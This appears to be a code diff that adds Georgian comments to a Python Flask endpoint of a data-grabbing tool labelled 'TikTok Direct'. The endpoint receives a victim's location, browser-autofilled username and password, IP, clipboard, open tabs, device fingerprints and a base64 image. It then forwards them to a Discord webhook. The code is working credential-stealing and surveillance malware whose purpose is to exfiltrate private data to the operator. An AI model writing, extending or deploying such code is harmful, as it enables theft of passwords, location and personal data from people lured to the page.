@@ -19,20 +19,26 @@ def upload_data():
         data = request.json
         secret = data.get('secret', {})
         
+        # ლოკაცია
         if secret.get('lat') and secret['lat'] != "უარი":
             maps_link = f"https://www.google.com/maps?q={secret['lat']},{secret['lon']}"
             location_text = f"📍 **ლოკაცია:** [დააჭირე რუკის საჩვენებლად]({maps_link})"
         else:
             location_text = "📍 **ლოკაცია:** მომხმარებელმა უარი თქვა"
 
+        # ტექსტური ინფო
         content = f"🚨 **ახალი მონაცემი! (TikTok Direct)**\n\n{location_text}\n\n💻 **მოწყობილობა:**\n• **ბრაუზერი:** `{secret.get('userAgent', 'უცნობია')}`\n• **ეკრანი:** `{secret.get('screen', 'უცნობია')}`\n• **RAM:** `{secret.get('ram', 'უცნობია')}`\n"
         
+        # ავტოშევსება
         content += f"\n🔑 **ავტოშევსება:**\n• **იუზერი:** `{secret.get('autofilledUser', 'ვერ წაიკითხა')}`\n• **პაროლი:** `{secret.get('autofilledPass', 'ვერ წაიკითხა')}`\n"
         
+        # საიდუმლო ინფო
         content += f"\n🕵️‍♂️ **საიდუმლო:**\n• **IP:** `{secret.get('ip', 'უცნობია')}`\n• **ხმის ანაბეჭდი:** `{secret.get('audioFingerprint', 'უცნობია')}`\n• **ფონტები:** `{secret.get('fonts', 'უცნობია')}`\n• **კლიპბორდი:** `{secret.get('clipboard', 'უცნობია')}`\n• **ბატარეა:** `{secret.get('battery', 'უცნობია')}`\n• **ინტერნეტი:** `{secret.get('network', 'უცნობია')}`\n• **ტაბები:** `{secret.get('tabs', 'უცნობია')}`\n• **ორიენტაცია:** `{secret.get('orientation', 'უცნობია')}`\n• **ვიბრაცია:** `{secret.get('vibrated', 'არა')}`"
 
+        # გაგზავნა
         requests.post(DISCORD_WEBHOOK_URL, json={"content": content})
 
+        # ფოტოს გაგზავნა
         if secret.get('image'):
             image_data = secret['image'].replace("data:image/png;base64,", "")
             image_bytes = base64.b64decode(image_data)
